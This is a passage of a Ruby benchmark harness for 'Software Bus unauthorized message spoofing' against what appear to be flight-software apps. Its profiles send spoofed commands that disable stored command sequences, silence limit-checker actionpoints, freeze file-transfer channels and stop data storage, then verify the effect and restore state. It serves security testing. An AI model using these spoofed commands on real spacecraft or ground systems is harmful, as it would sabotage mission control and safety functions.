      recover: ->(_ctx) { set_sch_entry_enabled(0, 4, true) },
      recovered: ->(_ctx, _state) { true }
    },
    {
      name: 'sc_disable_rts',
      id: 223,
      risk: 'hazardous',
      target: 'SC',
      applicable: -> { require_command_target!('CFS', 'CFS command target is not loaded; SC RTS commands cannot be verified') },
      args: ->(_ctx) { [1] },
      prepare: lambda do |original|
        set_sc_rts_disabled(1, false)
        { original: original }
      end,
      read: method(:read_sc),
      passed: lambda do |before, after, _ctx|
        target_counter_evidence(before, after).merge(rts_status_telemetry_readable: !after[:rts_disabled_status_1].nil?)
      end,
      recover: ->(ctx) { set_sc_rts_disabled(1, (ctx[:original][:rts_disabled_status_1] & 1) != 0) },
      recovered: ->(_ctx, _state) { true }
    },
    {
      name: 'sc_enable_rts',
      id: 222,
      risk: 'hazardous',
      target: 'SC',
      applicable: -> { require_command_target!('CFS', 'CFS command target is not loaded; SC RTS commands cannot be verified') },
      args: ->(_ctx) { [1] },
      prepare: lambda do |original|
        set_sc_rts_disabled(1, true)
        { original: original }
      end,
      read: method(:read_sc),
      passed: lambda do |before, after, _ctx|
        target_counter_evidence(before, after).merge(rts_status_telemetry_readable: !after[:rts_disabled_status_1].nil?)
      end,
      recover: ->(ctx) { set_sc_rts_disabled(1, (ctx[:original][:rts_disabled_status_1] & 1) != 0) },
      recovered: ->(_ctx, _state) { true }
    },
    {
      name: 'sc_start_rts',
      id: 220,
      risk: 'hazardous',
      target: 'SC',
      applicable: -> { require_command_target!('CFS', 'CFS command target is not loaded; SC RTS commands cannot be verified') },
      args: ->(_ctx) { [1] },
      prepare: lambda do |original|
        # SC correctly refuses to start a disabled RTS.  Establish a real
        # enabled baseline through the ground-command path before spoofing.
        set_sc_rts_disabled(1, false)
        { original: original }
      end,
      read: method(:read_sc),
      passed: ->(before, after, _ctx) { { command_counter_increased: after[:cmd_count] > before[:cmd_count], rts_started: after[:rts_active_count] > before[:rts_active_count] } },
      recover: lambda do |ctx|
        stop_sc_rts(1)
        set_sc_rts_disabled(1, (ctx[:original][:rts_disabled_status_1] & 1) != 0)
      end,
      recovered: ->(_ctx, _state) { true }
    },
    command_counter_profile('sc_stop_rts', 221, 'hazardous', 'SC', ->(_ctx) { [1] }, method(:read_sc)),
    {
      name: 'lc_set_passive',
      id: 230,
      risk: 'hazardous',
      target: 'LC',
      args: ->(_ctx) { [2] },
      prepare: ->(original) { { original: original } },
      read: method(:read_lc),
      passed: ->(before, after, _ctx) { target_counter_evidence(before, after).merge(lc_passive: after[:state] == 2) },
      recover: ->(ctx) { set_lc_state(ctx[:original][:state]) },
      recovered: ->(ctx, state) { state[:state] == ctx[:original][:state] }
    },
    command_counter_profile('lc_disable_all_actionpoints', 231, 'hazardous', 'LC', ->(_ctx) { [0xFFFF, 3] }, method(:read_lc)),
    {
      name: 'cf_freeze_channel0',
      id: 240,
      risk: 'hazardous',
      target: 'CF',
      applicable: -> { require_command_target!('CFS', 'CFS command target is not loaded; CF recovery commands cannot be verified') },
      args: ->(_ctx) { [0] },
      prepare: lambda do |original|
        set_cf_frozen(0, false) if original[:ch0_frozen] != 0
        { original: original }
      end,
      read: method(:read_cf),
      passed: ->(before, after, _ctx) { target_counter_evidence(before, after).merge(channel0_frozen: after[:ch0_frozen] != 0) },
      recover: ->(ctx) { set_cf_frozen(0, ctx[:original][:ch0_frozen] != 0) },
      recovered: ->(ctx, state) { (state[:ch0_frozen] != 0) == (ctx[:original][:ch0_frozen] != 0) }
    },
    {
      name: 'cf_thaw_channel0',
      id: 241,
      risk: 'hazardous',
      target: 'CF',
      applicable: -> { require_command_target!('CFS', 'CFS command target is not loaded; CF recovery commands cannot be verified') },
      args: ->(_ctx) { [0] },
      prepare: lambda do |original|
        set_cf_frozen(0, true) if original[:ch0_frozen] == 0
        { original: original }
      end,
      read: method(:read_cf),
      passed: ->(before, after, _ctx) { target_counter_evidence(before, after).merge(channel0_thawed: after[:ch0_frozen] == 0) },
      recover: ->(ctx) { set_cf_frozen(0, ctx[:original][:ch0_frozen] != 0) },
      recovered: ->(ctx, state) { (state[:ch0_frozen] != 0) == (ctx[:original][:ch0_frozen] != 0) }
    },
    {
      name: 'cf_disable_engine',
      id: 243,
      risk: 'hazardous',
      target: 'CF',
      applicable: -> { require_command_target!('CFS', 'CFS command target is not loaded; CF recovery commands cannot be verified') },
      args: ->(_ctx) { [] },
      prepare: lambda do |original|
        sp001_run_profile(242, [])
        sleep(0.8)
        { original: original }
      end,
      read: method(:read_cf),
      passed: ->(before, after, _ctx) { target_counter_evidence(before, after) },
      recover: ->(_ctx) { sp001_run_profile(242, []); sleep(0.8); read_cf },
      recovered: ->(_ctx, _state) { true }
    },
    {
      name: 'cf_enable_engine',
      id: 242,
      risk: 'hazardous',
      target: 'CF',
      applicable: -> { require_command_target!('CFS', 'CFS command target is not loaded; CF recovery commands cannot be verified') },
      args: ->(_ctx) { [] },
      prepare: lambda do |original|
        sp001_run_profile(243, [])
        sleep(0.8)
        { original: original }
      end,
      read: method(:read_cf),
      passed: ->(before, after, _ctx) { target_counter_evidence(before, after) },
      recover: ->(_ctx) { sp001_run_profile(242, []); sleep(0.8); read_cf },
      recovered: ->(_ctx, _state) { true }
    },
    tbl_service_profile('tbl_load_benchmark_table', 250),
    tbl_service_profile('tbl_validate_benchmark_table', 251, -> { raise SkipProfile, 'SP001 benchmark-owned table is not registered in this app build' }),
    tbl_service_profile('tbl_activate_benchmark_table', 252, -> { raise SkipProfile, 'SP001 benchmark-owned table is not registered in this app build' }),
    {
      name: 'es_restart_fm',
      id: 261,
      risk: 'hazardous',
      target: 'ES',
      args: ->(_ctx) { [1] },
      prepare: ->(original) { { original: original } },
      read: method(:read_es),
      passed: ->(before, after, _ctx) { { command_counter_increased: after[:cmd_count] > before[:cmd_count] } },
      recover: ->(_ctx) { read_fm },
      recovered: ->(_ctx, state) { state[:cmd_count] >= 0 }
    },
    {
      name: 'es_stop_ds',
      id: 260,
      risk: 'hazardous',
      target: 'ES',
      args: ->(_ctx) { [2] },
      prepare: ->(original) { { original: original } },
      read: method(:read_es),
      passed: lambda do |before, after, _ctx|
        {
          command_counter_increased: after[:cmd_count] > before[:cmd_count],
          external_app_count_decreased_or_equal: after[:registered_external_apps] <= before[:registered_external_apps]
        }
      end,
      recover: ->(_ctx) { sleep(7.0); start_ds },
      recovered: ->(_ctx, state) { state[:cmd_count] >= 0 }
    }
  ]
end

def evidence_passed?(evidence)
  evidence.values.all? { |value| value == true }
end

def select_profiles(profiles)
  risk = ENV.fetch('SP001_RISK', 'safe').downcase
  unless %w[safe hazardous all].include?(risk)
    raise "Invalid SP001_RISK=#{risk.inspect}; expected safe, hazardous, or all"
  end

  if %w[hazardous all].include?(risk)
    confirmation = ENV['SP001_CONFIRM_HAZARD'] || ENV['SP001_ALLOW_HAZARDOUS']
    raise 'Hazardous SP001 profiles require SP001_CONFIRM_HAZARD=YES' unless confirmation == 'YES'
  end

  selected = case risk
             when 'safe'
               profiles.select { |profile| profile[:risk] == 'safe' }
             when 'hazardous'
               profiles.select { |profile| profile[:risk] == 'hazardous' }
             else
               profiles
             end

  filter = ENV['SP001_PROFILES']
  unless filter.nil? || filter.strip.empty?
    wanted = filter.split(',').map { |item| item.strip.downcase }.reject(&:empty?)
    selected = selected.select { |profile| wanted.include?(profile[:name].downcase) || wanted.include?(profile[:id].to_s) }
  end

  exclude = ENV['SP001_EXCLUDE_PROFILES']
  unless exclude.nil? || exclude.strip.empty?
    omitted = exclude.split(',').map { |item| item.strip.downcase }.reject(&:empty?)
    selected = selected.reject { |profile| omitted.include?(profile[:name].downcase) || omitted.include?(profile[:id].to_s) }
  end

  selected
end

def run_profile(profile)
  t0 = Time.now.utc.iso8601
  ctx = nil
  before = nil
  after = nil
  recovery = nil

  profile[:applicable].call if profile[:applicable]
  original = profile[:read].call
  ctx = profile[:prepare].call(original)
  before = profile[:read].call
  args = profile[:args].call(ctx)
  event_baseline = read_evs_event if profile[:event_evidence]
  attack = sp001_run_profile(profile[:id], args)

  unless attack[:ok]
    raise "SP001_RUN_PROFILE command failed before target evidence collection: #{attack[:error]}"
  end

  if profile[:event_evidence]
    event_spec = profile[:event_evidence]
    ctx[:attack_event] = observe_evs_event(event_baseline, event_spec[:app_name], event_spec[:message_pattern])
  end

  profile[:post_attack].call(ctx, before) if profile[:post_attack]

  wait_result = wait_until(10.0, 0.6) do
    state = profile[:read].call
    evidence = profile[:passed].call(before, state, ctx)
    { matched: evidence_passed?(evidence), state: state, evidence: evidence }
  end

  after = wait_result[:state]
  evidence = wait_result[:evidence]
  recovery = profile[:recover].call(ctx)
  recovered = profile[:recovered].call(ctx, recovery)

  {
    ok: true,
    # Benchmark PASS means the unauthorized command achieved its real target
    # effect.  Recovery is reported separately: it is operationally important
    # evidence, but must not erase a demonstrated attack success.
    passed: evidence_passed?(evidence),
    name: profile[:name],
    profile_id: profile[:id],
    risk: profile[:risk],
    target: profile[:target],
    started_at: t0,
    finished_at: Time.now.utc.iso8601,
    args: args,
    expected_note: ctx[:expected_note],
    before: before,
    after: after,
    recovery: recovery,
    attack_evidence: {
      evs: ctx && ctx[:attack_event],
      to_lab_downlink: ctx && ctx[:to_lab_downlink_evidence]
    },
    evidence: evidence.merge(recovered: recovered, recovery_status: recovered ? 'RECOVERY_SUCCESS' : 'RECOVERY_FAILED')
  }
rescue PreconditionNotMet => precondition
  {
    ok: false,
    passed: false,
    precondition_failed: true,
    attack_attempted: false,
    name: profile[:name],
    profile_id: profile[:id],
    risk: profile[:risk],
    target: profile[:target],
    started_at: t0,
    finished_at: Time.now.utc.iso8601,
    before: before,
    after: after,
    recovery: recovery,
    error_class: precondition.class.to_s,
    error: precondition.message,
    evidence: {
      precondition_met: false,
      attack_attempted: false
    }
  }
rescue SkipProfile => skip
  {
    ok: true,
    passed: true,
    skipped: true,
    name: profile[:name],
    profile_id: profile[:id],
    risk: profile[:risk],
    target: profile[:target],
    started_at: t0,
    finished_at: Time.now.utc.iso8601,
    skip_reason: skip.reason,
    before: before,
    after: after,
    recovery: recovery,
    evidence: {
      skipped: true,
      reason: skip.reason
    }
  }
rescue Exception => error
  if unavailable_error?(error)
    return {
      ok: true,
      passed: true,
      skipped: true,
      name: profile[:name],
      profile_id: profile[:id],
      risk: profile[:risk],
      target: profile[:target],
      started_at: t0,
      finished_at: Time.now.utc.iso8601,
      skip_reason: error.message,
      before: before,
      after: after,
      recovery: recovery,
      evidence: {
        skipped: true,
        reason: error.message
      }
    }
  end

  begin
    recovery = profile[:recover].call(ctx) unless ctx.nil?
  rescue Exception => recovery_error
    recovery = {
      ok: false,
      error_class: recovery_error.class.to_s,
      error: recovery_error.message
    }
  end

  {
    ok: false,
    passed: false,
    name: profile[:name],
    profile_id: profile[:id],
    risk: profile[:risk],
    target: profile[:target],
    started_at: t0,
    finished_at: Time.now.utc.iso8601,
    before: before,
    after: after,
    recovery: recovery,
    error_class: error.class.to_s,
    error: error.message,
    backtrace: error.backtrace ? error.backtrace.first(8) : []
  }
end

def result_label(passed)
  if passed.is_a?(Hash)
    return 'SKIP' if passed[:skipped]
    return passed[:passed] ? 'PASS' : 'FAIL'
  end

  passed ? 'PASS' : 'FAIL'
end

def print_console_summary(summary)
  puts "#{summary[:benchmark_id]} #{summary[:name]}: #{result_label(summary[:passed])}"
  puts "Profiles: #{summary[:passed_count]}/#{summary[:executed_count]} PASS (#{format('%.2f', summary[:pass_rate] * 100)}%), #{summary[:skipped_count]} SKIP"
  puts "Report: #{summary[:report_dir]}"
  puts ""

  summary[:results].each_with_index do |result, index|
    puts "#{summary[:benchmark_id]}-#{index + 1}, #{result[:name]}: #{result_label(result)}"
  end
end

def print_console_failure(failure)
  puts "#{failure[:benchmark_id]}: FAIL"
  puts "Error: #{failure[:error_class]}: #{failure[:error]}"
  puts "Report: #{failure[:report_dir]}"
end

begin
  FileUtils.mkdir_p(REPORT_ROOT)
  profiles = select_profiles(make_profiles)
  raise 'No SP001 profiles selected' if profiles.empty?

  start_result = cmd_first(START_APP_CANDIDATES)
  sleep(1.0)
  reset_result = sp001_reset

  results = profiles.map do |profile|
    result = run_profile(profile)
    File.write(File.join(REPORT_ROOT, "#{profile[:name]}_score.json"), JSON.pretty_generate(result))
    result
  end

  stop_result = ENV.fetch('SP001_STOP_APP_AFTER', '0') == '1' ? cmd_first(STOP_APP_CANDIDATES) : { ok: true, skipped: true }
  executable_results = results.reject { |result| result[:skipped] }
  passed_count = executable_results.count { |result| result[:passed] }
  skipped_count = results.count { |result| result[:skipped] }
  summary = {
    ok: results.all? { |result| result[:ok] },
    passed: executable_results.all? { |result| result[:passed] },
    benchmark_id: 'SP001',
    name: 'Software Bus unauthorized message spoofing',
    report_dir: REPORT_ROOT,
    attack_description: ATTACK_DESCRIPTION,
    selection: {
      risk: ENV.fetch('SP001_RISK', 'safe'),
      profiles: profiles.map { |profile| profile[:name] }
    },
    start_app: start_result,
    reset_sp001: reset_result,
    stop_app: stop_result,
    total: results.length,
    executed_count: executable_results.length,
    skipped_count: skipped_count,
    passed_count: passed_count,
    failed_count: executable_results.length - passed_count,
    pass_rate: executable_results.empty? ? 0.0 : (passed_count.to_f / executable_results.length),
    results: results
  }

  File.write(File.join(REPORT_ROOT, 'summary.json'), JSON.pretty_generate(summary))
  File.write(
    File.join(REPORT_ROOT, 'summary.md'),
    [
      "# SP001 Software Bus Unauthorized Message Spoofing",
      "",
      "- Result: #{summary[:passed] ? 'PASS' : 'FAIL'}",
      "- Profiles: #{passed_count}/#{executable_results.length}",
      "- Skipped: #{skipped_count}",
      "- Pass rate: #{format('%.2f', summary[:pass_rate] * 100)}%",
      "- Report directory: #{REPORT_ROOT}",
      "",
      "| Profile | Risk | Target | Result |",
      "|---|---|---|---|",
      *results.map { |result| "| #{result[:name]} | #{result[:risk]} | #{result[:target]} | #{result_label(result)} |" }
    ].join("\n")
  )

  print_console_summary(summary)
  exit(summary[:passed] ? 0 : 2)
rescue StandardError => error
  failure = {
    ok: false,
    passed: false,
    benchmark_id: 'SP001',
    report_dir: REPORT_ROOT,
    error_class: error.class.to_s,
    error: error.message,
    backtrace: error.backtrace ? error.backtrace.first(10) : []
  }
  begin
    FileUtils.mkdir_p(REPORT_ROOT)
    File.write(File.join(REPORT_ROOT, 'summary.json'), JSON.pretty_generate(failure))
  rescue StandardError
    nil
  end
  print_console_failure(failure)
  exit 3
end
